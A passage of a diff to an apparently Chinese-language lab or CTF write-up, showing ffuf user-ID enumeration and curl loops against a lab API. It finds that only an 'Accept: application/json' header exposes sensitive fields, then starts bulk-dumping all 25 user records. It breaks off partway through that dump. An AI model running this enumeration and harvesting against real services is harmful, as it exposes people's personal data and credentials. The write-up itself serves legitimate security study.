+<span class="pl-s"> :: Wordlist         : FUZZ: /proc/self/fd/11</span>
+<span class="pl-s"> :: Follow redirects : false</span>
+<span class="pl-s"> :: Calibration      : false</span>
+<span class="pl-s"> :: Timeout          : 10</span>
+<span class="pl-s"> :: Threads          : 100</span>
+<span class="pl-s"> :: Matcher          : Response status: 200</span>
+<span class="pl-s">________________________________________________</span>
+<span class="pl-s"></span>
+<span class="pl-s">1222                    [Status: 200, Size: 284, Words: 20, Lines: 12, Duration: 236ms]</span>
+<span class="pl-s">1226                    [Status: 200, Size: 288, Words: 20, Lines: 12, Duration: 233ms]</span>
+<span class="pl-s">1335                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 219ms]</span>
+<span class="pl-s">1595                    [Status: 200, Size: 292, Words: 20, Lines: 12, Duration: 219ms]</span>
+<span class="pl-s">1818                    [Status: 200, Size: 280, Words: 20, Lines: 12, Duration: 211ms]</span>
+<span class="pl-s">1954                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 195ms]</span>
+<span class="pl-s">3931                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 201ms]</span>
+<span class="pl-s">4257                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 205ms]</span>
+<span class="pl-s">4526                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]</span>
+<span class="pl-s">4741                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 199ms]</span>
+<span class="pl-s">4828                    [Status: 200, Size: 281, Words: 20, Lines: 12, Duration: 202ms]</span>
+<span class="pl-s">5119                    [Status: 200, Size: 283, Words: 20, Lines: 12, Duration: 204ms]</span>
+<span class="pl-s">5219                    [Status: 200, Size: 288, Words: 20, Lines: 12, Duration: 206ms]</span>
+<span class="pl-s">6530                    [Status: 200, Size: 289, Words: 20, Lines: 12, Duration: 205ms]</span>
+<span class="pl-s">6694                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 204ms]</span>
+<span class="pl-s">7009                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]</span>
+<span class="pl-s">7465                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 203ms]</span>
+<span class="pl-s">7920                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 202ms]</span>
+<span class="pl-s">8024                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 205ms]</span>
+<span class="pl-s">8038                    [Status: 200, Size: 286, Words: 20, Lines: 12, Duration: 204ms]</span>
+<span class="pl-s">8764                    [Status: 200, Size: 285, Words: 20, Lines: 12, Duration: 202ms]</span>
+<span class="pl-s">9050                    [Status: 200, Size: 282, Words: 20, Lines: 12, Duration: 204ms]</span>
+<span class="pl-s">9182                    [Status: 200, Size: 285, Words: 20, Lines: 12, Duration: 207ms]</span>
+<span class="pl-s">9409                    [Status: 200, Size: 287, Words: 20, Lines: 12, Duration: 203ms]</span>
+<span class="pl-s">9944                    [Status: 200, Size: 284, Words: 20, Lines: 12, Duration: 201ms]</span></pre></div>
 <p>把这些 uid 保存下来备用：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ printf &quot;1222\n1226\n1335\n1595\n1818\n1954\n3931\n4257\n4526\n4741\n4828\n5119\n5219\n6530\n6694\n7009\n7465\n7920\n8024\n8038\n8764\n9050\n9182\n9409\n9944\n&quot; | tee /tmp/uids.txt
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">"</span>1222\n1226\n1335\n1595\n1818\n1954\n3931\n4257\n4526\n4741\n4828\n5119\n5219\n6530\n6694\n7009\n7465\n7920\n8024\n8038\n8764\n9050\n9182\n9409\n9944\n<span class="pl-pds">"</span></span> <span class="pl-k">|</span> tee /tmp/uids.txt
 1222
 1226
 1335
@@ -488,13 +486,12 @@ ________________________________________________
 9050
 9182
 9409
-9944
-</code></pre>
-<hr />
+9944</pre></div>
+<hr>
 <h2>不同 Accept 下的差异</h2>
 <p>这次对一个<strong>真实存在</strong>的 uid 再测一遍：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ for ct in application/json application/xml text/xml application/yaml text/yaml application/x-yaml application/* '*/*'; do echo &quot;== Accept: $ct ==&quot;; curl -si 192.168.205.217:5566/api/user/1222 -H &quot;Accept: $ct&quot;; echo; done
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-k">for</span> <span class="pl-smi">ct</span> <span class="pl-k">in</span> application/json application/xml text/xml application/yaml text/yaml application/x-yaml application/<span class="pl-k">*</span> <span class="pl-s"><span class="pl-pds">'</span>*/*<span class="pl-pds">'</span></span><span class="pl-k">;</span> <span class="pl-k">do</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>== Accept: <span class="pl-smi">$ct</span> ==<span class="pl-pds">"</span></span><span class="pl-k">;</span> curl -si 192.168.205.217:5566/api/user/1222 -H <span class="pl-s"><span class="pl-pds">"</span>Accept: <span class="pl-smi">$ct</span><span class="pl-pds">"</span></span><span class="pl-k">;</span> <span class="pl-c1">echo</span><span class="pl-k">;</span> <span class="pl-k">done</span>
 == Accept: application/json ==
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
@@ -503,320 +500,310 @@ Content-Type: application/json
 Content-Length: 318
 Connection: close
 
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u4ea7\u54c1\u90e8&quot;,&quot;display_name&quot;:&quot;Guo Hui&quot;,&quot;email&quot;:&quot;guohui1222@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13830237187&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;product&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:1222,&quot;username&quot;:&quot;guohui1222&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4ea7\u54c1\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Guo Hui<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>guohui1222@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13830237187<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>product<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:1222,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>guohui1222<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == Accept: application/xml ==
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 13:25:34 GMT
-Content-Type: text/xml; charset=utf-8; charset=utf-8
+Content-Type: text/xml<span class="pl-k">;</span> charset=utf-8<span class="pl-k">;</span> charset=utf-8
 Content-Length: 284
 Connection: close
 
-&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;user&gt;
-  &lt;uid&gt;1222&lt;/uid&gt;
-  &lt;username&gt;guohui1222&lt;/username&gt;
-  &lt;display_name&gt;Guo Hui&lt;/display_name&gt;
-  &lt;role&gt;product&lt;/role&gt;
-  &lt;department&gt;产品部&lt;/department&gt;
-  &lt;email&gt;guohui1222@mazesec.dsz&lt;/email&gt;
-  &lt;phone&gt;13830237187&lt;/phone&gt;
-  &lt;status&gt;active&lt;/status&gt;
-&lt;/user&gt;
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>user<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>uid<span class="pl-k">&gt;</span>1<span class="pl-k">222&lt;</span>/uid<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span>guohui<span class="pl-k">1222&lt;</span>/username<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>display_name<span class="pl-k">&gt;</span>Guo Hui<span class="pl-k">&lt;</span>/display_name<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>role<span class="pl-k">&gt;</span>product<span class="pl-k">&lt;</span>/role<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>department<span class="pl-k">&gt;</span>产品部<span class="pl-k">&lt;</span>/department<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>email<span class="pl-k">&gt;</span>guohui1222@mazesec.dsz<span class="pl-k">&lt;</span>/email<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>phone<span class="pl-k">&gt;</span>1<span class="pl-k">3830237187&lt;</span>/phone<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>status<span class="pl-k">&gt;</span>active<span class="pl-k">&lt;</span>/status<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/user<span class="pl-k">&gt;</span>
 
 == Accept: text/xml ==
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 13:25:34 GMT
-Content-Type: text/xml; charset=utf-8; charset=utf-8
+Content-Type: text/xml<span class="pl-k">;</span> charset=utf-8<span class="pl-k">;</span> charset=utf-8
 Content-Length: 284
 Connection: close
 
-&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;user&gt;
-  &lt;uid&gt;1222&lt;/uid&gt;
-  &lt;username&gt;guohui1222&lt;/username&gt;
-  &lt;display_name&gt;Guo Hui&lt;/display_name&gt;
-  &lt;role&gt;product&lt;/role&gt;
-  &lt;department&gt;产品部&lt;/department&gt;
-  &lt;email&gt;guohui1222@mazesec.dsz&lt;/email&gt;
-  &lt;phone&gt;13830237187&lt;/phone&gt;
-  &lt;status&gt;active&lt;/status&gt;
-&lt;/user&gt;
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>user<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>uid<span class="pl-k">&gt;</span>1<span class="pl-k">222&lt;</span>/uid<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span>guohui<span class="pl-k">1222&lt;</span>/username<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>display_name<span class="pl-k">&gt;</span>Guo Hui<span class="pl-k">&lt;</span>/display_name<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>role<span class="pl-k">&gt;</span>product<span class="pl-k">&lt;</span>/role<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>department<span class="pl-k">&gt;</span>产品部<span class="pl-k">&lt;</span>/department<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>email<span class="pl-k">&gt;</span>guohui1222@mazesec.dsz<span class="pl-k">&lt;</span>/email<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>phone<span class="pl-k">&gt;</span>1<span class="pl-k">3830237187&lt;</span>/phone<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>status<span class="pl-k">&gt;</span>active<span class="pl-k">&lt;</span>/status<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/user<span class="pl-k">&gt;</span>
 
 == Accept: application/yaml ==
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 13:25:34 GMT
-Content-Type: text/xml; charset=utf-8; charset=utf-8
+Content-Type: text/xml<span class="pl-k">;</span> charset=utf-8<span class="pl-k">;</span> charset=utf-8
 Content-Length: 284
 Connection: close
 
-&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;user&gt;
-  &lt;uid&gt;1222&lt;/uid&gt;
-  &lt;username&gt;guohui1222&lt;/username&gt;
-  &lt;display_name&gt;Guo Hui&lt;/display_name&gt;
-  &lt;role&gt;product&lt;/role&gt;
-  &lt;department&gt;产品部&lt;/department&gt;
-  &lt;email&gt;guohui1222@mazesec.dsz&lt;/email&gt;
-  &lt;phone&gt;13830237187&lt;/phone&gt;
-  &lt;status&gt;active&lt;/status&gt;
-&lt;/user&gt;
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>user<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>uid<span class="pl-k">&gt;</span>1<span class="pl-k">222&lt;</span>/uid<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span>guohui<span class="pl-k">1222&lt;</span>/username<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>display_name<span class="pl-k">&gt;</span>Guo Hui<span class="pl-k">&lt;</span>/display_name<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>role<span class="pl-k">&gt;</span>product<span class="pl-k">&lt;</span>/role<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>department<span class="pl-k">&gt;</span>产品部<span class="pl-k">&lt;</span>/department<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>email<span class="pl-k">&gt;</span>guohui1222@mazesec.dsz<span class="pl-k">&lt;</span>/email<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>phone<span class="pl-k">&gt;</span>1<span class="pl-k">3830237187&lt;</span>/phone<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>status<span class="pl-k">&gt;</span>active<span class="pl-k">&lt;</span>/status<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/user<span class="pl-k">&gt;</span>
 
 == Accept: text/yaml ==
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 13:25:34 GMT
-Content-Type: text/xml; charset=utf-8; charset=utf-8
+Content-Type: text/xml<span class="pl-k">;</span> charset=utf-8<span class="pl-k">;</span> charset=utf-8
 Content-Length: 284
 Connection: close
 
-&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;user&gt;
-  &lt;uid&gt;1222&lt;/uid&gt;
-  &lt;username&gt;guohui1222&lt;/username&gt;
-  &lt;display_name&gt;Guo Hui&lt;/display_name&gt;
-  &lt;role&gt;product&lt;/role&gt;
-  &lt;department&gt;产品部&lt;/department&gt;
-  &lt;email&gt;guohui1222@mazesec.dsz&lt;/email&gt;
-  &lt;phone&gt;13830237187&lt;/phone&gt;
-  &lt;status&gt;active&lt;/status&gt;
-&lt;/user&gt;
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>user<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>uid<span class="pl-k">&gt;</span>1<span class="pl-k">222&lt;</span>/uid<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span>guohui<span class="pl-k">1222&lt;</span>/username<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>display_name<span class="pl-k">&gt;</span>Guo Hui<span class="pl-k">&lt;</span>/display_name<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>role<span class="pl-k">&gt;</span>product<span class="pl-k">&lt;</span>/role<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>department<span class="pl-k">&gt;</span>产品部<span class="pl-k">&lt;</span>/department<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>email<span class="pl-k">&gt;</span>guohui1222@mazesec.dsz<span class="pl-k">&lt;</span>/email<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>phone<span class="pl-k">&gt;</span>1<span class="pl-k">3830237187&lt;</span>/phone<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>status<span class="pl-k">&gt;</span>active<span class="pl-k">&lt;</span>/status<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/user<span class="pl-k">&gt;</span>
 
 == Accept: application/x-yaml ==
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 13:25:34 GMT
-Content-Type: text/xml; charset=utf-8; charset=utf-8
+Content-Type: text/xml<span class="pl-k">;</span> charset=utf-8<span class="pl-k">;</span> charset=utf-8
 Content-Length: 284
 Connection: close
 
-&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;user&gt;
-  &lt;uid&gt;1222&lt;/uid&gt;
-  &lt;username&gt;guohui1222&lt;/username&gt;
-  &lt;display_name&gt;Guo Hui&lt;/display_name&gt;
-  &lt;role&gt;product&lt;/role&gt;
-  &lt;department&gt;产品部&lt;/department&gt;
-  &lt;email&gt;guohui1222@mazesec.dsz&lt;/email&gt;
-  &lt;phone&gt;13830237187&lt;/phone&gt;
-  &lt;status&gt;active&lt;/status&gt;
-&lt;/user&gt;
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>user<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>uid<span class="pl-k">&gt;</span>1<span class="pl-k">222&lt;</span>/uid<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span>guohui<span class="pl-k">1222&lt;</span>/username<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>display_name<span class="pl-k">&gt;</span>Guo Hui<span class="pl-k">&lt;</span>/display_name<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>role<span class="pl-k">&gt;</span>product<span class="pl-k">&lt;</span>/role<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>department<span class="pl-k">&gt;</span>产品部<span class="pl-k">&lt;</span>/department<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>email<span class="pl-k">&gt;</span>guohui1222@mazesec.dsz<span class="pl-k">&lt;</span>/email<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>phone<span class="pl-k">&gt;</span>1<span class="pl-k">3830237187&lt;</span>/phone<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>status<span class="pl-k">&gt;</span>active<span class="pl-k">&lt;</span>/status<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/user<span class="pl-k">&gt;</span>
 
-== Accept: application/* ==
+== Accept: application/<span class="pl-k">*</span> ==
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 13:25:34 GMT
-Content-Type: text/xml; charset=utf-8; charset=utf-8
+Content-Type: text/xml<span class="pl-k">;</span> charset=utf-8<span class="pl-k">;</span> charset=utf-8
 Content-Length: 284
 Connection: close
 
-&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;user&gt;
-  &lt;uid&gt;1222&lt;/uid&gt;
-  &lt;username&gt;guohui1222&lt;/username&gt;
-  &lt;display_name&gt;Guo Hui&lt;/display_name&gt;
-  &lt;role&gt;product&lt;/role&gt;
-  &lt;department&gt;产品部&lt;/department&gt;
-  &lt;email&gt;guohui1222@mazesec.dsz&lt;/email&gt;
-  &lt;phone&gt;13830237187&lt;/phone&gt;
-  &lt;status&gt;active&lt;/status&gt;
-&lt;/user&gt;
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>user<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>uid<span class="pl-k">&gt;</span>1<span class="pl-k">222&lt;</span>/uid<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span>guohui<span class="pl-k">1222&lt;</span>/username<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>display_name<span class="pl-k">&gt;</span>Guo Hui<span class="pl-k">&lt;</span>/display_name<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>role<span class="pl-k">&gt;</span>product<span class="pl-k">&lt;</span>/role<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>department<span class="pl-k">&gt;</span>产品部<span class="pl-k">&lt;</span>/department<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>email<span class="pl-k">&gt;</span>guohui1222@mazesec.dsz<span class="pl-k">&lt;</span>/email<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>phone<span class="pl-k">&gt;</span>1<span class="pl-k">3830237187&lt;</span>/phone<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>status<span class="pl-k">&gt;</span>active<span class="pl-k">&lt;</span>/status<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/user<span class="pl-k">&gt;</span>
 
-== Accept: */* ==
+== Accept: <span class="pl-k">*</span>/<span class="pl-k">*</span> ==
 HTTP/1.1 200 OK
 Server: Werkzeug/3.1.8 Python/3.14.3
 Date: Tue, 09 Jun 2026 13:25:34 GMT
-Content-Type: text/xml; charset=utf-8; charset=utf-8
+Content-Type: text/xml<span class="pl-k">;</span> charset=utf-8<span class="pl-k">;</span> charset=utf-8
 Content-Length: 284
 Connection: close
 
-&lt;?xml version=&quot;1.0&quot; ?&gt;
-&lt;user&gt;
-  &lt;uid&gt;1222&lt;/uid&gt;
-  &lt;username&gt;guohui1222&lt;/username&gt;
-  &lt;display_name&gt;Guo Hui&lt;/display_name&gt;
-  &lt;role&gt;product&lt;/role&gt;
-  &lt;department&gt;产品部&lt;/department&gt;
-  &lt;email&gt;guohui1222@mazesec.dsz&lt;/email&gt;
-  &lt;phone&gt;13830237187&lt;/phone&gt;
-  &lt;status&gt;active&lt;/status&gt;
-&lt;/user&gt;
-</code></pre>
+<span class="pl-k">&lt;</span><span class="pl-k">?</span>xml version=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span> <span class="pl-k">?</span><span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>user<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>uid<span class="pl-k">&gt;</span>1<span class="pl-k">222&lt;</span>/uid<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>username<span class="pl-k">&gt;</span>guohui<span class="pl-k">1222&lt;</span>/username<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>display_name<span class="pl-k">&gt;</span>Guo Hui<span class="pl-k">&lt;</span>/display_name<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>role<span class="pl-k">&gt;</span>product<span class="pl-k">&lt;</span>/role<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>department<span class="pl-k">&gt;</span>产品部<span class="pl-k">&lt;</span>/department<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>email<span class="pl-k">&gt;</span>guohui1222@mazesec.dsz<span class="pl-k">&lt;</span>/email<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>phone<span class="pl-k">&gt;</span>1<span class="pl-k">3830237187&lt;</span>/phone<span class="pl-k">&gt;</span>
+  <span class="pl-k">&lt;</span>status<span class="pl-k">&gt;</span>active<span class="pl-k">&lt;</span>/status<span class="pl-k">&gt;</span>
+<span class="pl-k">&lt;</span>/user<span class="pl-k">&gt;</span></pre></div>
 <p>到这里，漏洞点就非常明确了：</p>
-<pre lang="text"><code>只有显式指定 Accept: application/json 时，才会返回完整敏感字段
+<pre lang="text" class="notranslate"><code class="notranslate">只有显式指定 Accept: application/json 时，才会返回完整敏感字段
 其他常见 application/* 或 */* 都只会落到公开 XML 视图
 </code></pre>
 <p>所以后面的批量获取必须强制加上：</p>
-<pre lang="text"><code>-H 'Accept: application/json'
+<pre lang="text" class="notranslate"><code class="notranslate">-H 'Accept: application/json'
 </code></pre>
-<hr />
+<hr>
 <h2>敏感信息泄露</h2>
 <p>现在把 25 个用户的完整 JSON 全部拉出来：</p>
-<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ while read u; do echo &quot;== $u ==&quot;; curl -s 192.168.205.217:5566/api/user/$u -H 'Accept: application/json'; echo; done &lt; /tmp/uids.txt
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ <span class="pl-k">while</span> <span class="pl-c1">read</span> u<span class="pl-k">;</span> <span class="pl-k">do</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>== <span class="pl-smi">$u</span> ==<span class="pl-pds">"</span></span><span class="pl-k">;</span> curl -s 192.168.205.217:5566/api/user/<span class="pl-smi">$u</span> -H <span class="pl-s"><span class="pl-pds">'</span>Accept: application/json<span class="pl-pds">'</span></span><span class="pl-k">;</span> <span class="pl-c1">echo</span><span class="pl-k">;</span> <span class="pl-k">done</span> <span class="pl-k">&lt;</span> /tmp/uids.txt
 == 1222 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u4ea7\u54c1\u90e8&quot;,&quot;display_name&quot;:&quot;Guo Hui&quot;,&quot;email&quot;:&quot;guohui1222@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13830237187&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;product&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:1222,&quot;username&quot;:&quot;guohui1222&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4ea7\u54c1\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Guo Hui<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>guohui1222@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13830237187<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>product<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:1222,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>guohui1222<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 1226 ==
